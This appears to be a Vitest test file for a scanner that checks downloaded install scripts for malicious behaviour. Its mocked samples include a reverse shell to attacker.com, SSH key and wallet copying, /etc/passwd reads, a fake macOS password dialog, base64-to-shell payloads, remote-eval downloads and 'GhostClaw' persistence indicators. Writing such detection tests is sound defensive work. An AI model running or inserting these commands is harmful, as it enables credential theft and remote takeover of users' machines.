import { describe, it, expect, vi, beforeEach } from "vitest";
import { analyzeScript } from "../../src/checks/scriptAnalysis.js";
import { Severity } from "../../src/checks/types.js";

// Mock fetch globally
const mockFetch = vi.fn();
vi.stubGlobal("fetch", mockFetch);

function mockScriptResponse(content: string) {
  mockFetch.mockResolvedValueOnce({
    ok: true,
    text: () => Promise.resolve(content),
  });
}

function mockFetchError() {
  mockFetch.mockRejectedValueOnce(new Error("Network error"));
}

describe("scriptAnalysis", () => {
  beforeEach(() => {
    mockFetch.mockReset();
  });

  it("detects /etc/passwd access", async () => {
    mockScriptResponse('cat /etc/passwd | grep root');
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.CRITICAL)).toBe(true);
    expect(results.some((r) => r.title.includes("credential files"))).toBe(true);
  });

  it("detects SSH key theft", async () => {
    mockScriptResponse('cp ~/.ssh/id_rsa /tmp/.cache_data');
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.CRITICAL)).toBe(true);
    expect(results.some((r) => r.title.includes("SSH keys"))).toBe(true);
  });

  it("detects cryptocurrency wallet targeting", async () => {
    mockScriptResponse('find ~ -name "wallet.dat" -exec cp {} /tmp/');
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.CRITICAL)).toBe(true);
    expect(results.some((r) => r.title.includes("cryptocurrency"))).toBe(true);
  });

  it("detects GhostClaw dscl credential validation", async () => {
    mockScriptResponse('dscl . -authonly $USER $PASSWORD');
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.CRITICAL)).toBe(true);
    expect(results.some((r) => r.title.includes("GhostClaw"))).toBe(true);
  });

  it("detects GhostClaw system preferences manipulation", async () => {
    mockScriptResponse(
      'open x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles'
    );
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.CRITICAL)).toBe(true);
    expect(results.some((r) => r.title.includes("System Preferences"))).toBe(true);
  });

  it("detects GhostClaw persistence path", async () => {
    mockScriptResponse('mkdir -p ~/.cache/.npm_telemetry && cp payload.js ~/.cache/.npm_telemetry/monitor.js');
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.CRITICAL)).toBe(true);
    expect(results.some((r) => r.title.includes("GhostClaw persistence"))).toBe(true);
  });

  it("detects GhostClaw environment variables", async () => {
    mockScriptResponse('GHOST_PASSWORD_ONLY=0 node scripts/setup.js');
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.CRITICAL)).toBe(true);
    expect(results.some((r) => r.title.includes("GhostClaw environment"))).toBe(true);
  });

  it("detects reverse shell patterns", async () => {
    mockScriptResponse('bash -i >& /dev/tcp/attacker.com/4444 0>&1');
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.CRITICAL)).toBe(true);
    expect(results.some((r) => r.title.includes("reverse shell"))).toBe(true);
  });

  it("detects fake macOS dialogs via osascript", async () => {
    mockScriptResponse(
      'osascript -e \'display dialog "Enter your password" default answer "" with hidden answer\''
    );
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.HIGH)).toBe(true);
    expect(results.some((r) => r.title.includes("fake macOS dialog"))).toBe(true);
  });

  it("detects base64 obfuscation", async () => {
    mockScriptResponse('echo "bWFsd2FyZQ==" | base64 --decode | sh');
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.HIGH)).toBe(true);
    expect(results.some((r) => r.title.includes("base64"))).toBe(true);
  });

  it("detects disabled TLS certificate validation", async () => {
    mockScriptResponse('curl -k https://malicious.com/payload');
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.HIGH)).toBe(true);
    expect(results.some((r) => r.title.includes("TLS certificate"))).toBe(true);
  });

  it("detects persistence via launchctl", async () => {
    mockScriptResponse('launchctl load ~/Library/LaunchAgents/com.malware.plist');
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.severity === Severity.HIGH)).toBe(true);
    expect(results.some((r) => r.title.includes("persistence"))).toBe(true);
  });

  it("detects eval usage", async () => {
    mockScriptResponse('eval($(curl https://malicious.com/payload))');
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results.some((r) => r.title.includes("eval"))).toBe(true);
  });

  it("passes clean install scripts", async () => {
    mockScriptResponse(`#!/bin/bash
set -e
echo "Installing tool v1.0.0..."
mkdir -p /usr/local/bin
cp tool /usr/local/bin/tool
chmod +x /usr/local/bin/tool
echo "Done!"
`);
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results).toHaveLength(0);
  });

  it("handles fetch errors gracefully", async () => {
    mockFetchError();
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results).toHaveLength(1);
    expect(results[0].severity).toBe(Severity.MEDIUM);
    expect(results[0].title).toContain("Could not download");
  });

  it("handles HTTP error responses", async () => {
    mockFetch.mockResolvedValueOnce({ ok: false, status: 404 });
    const results = await analyzeScript("https://example.com/install.sh", 512);
    expect(results).toHaveLength(1);
    expect(results[0].severity).toBe(Severity.MEDIUM);
  });
});
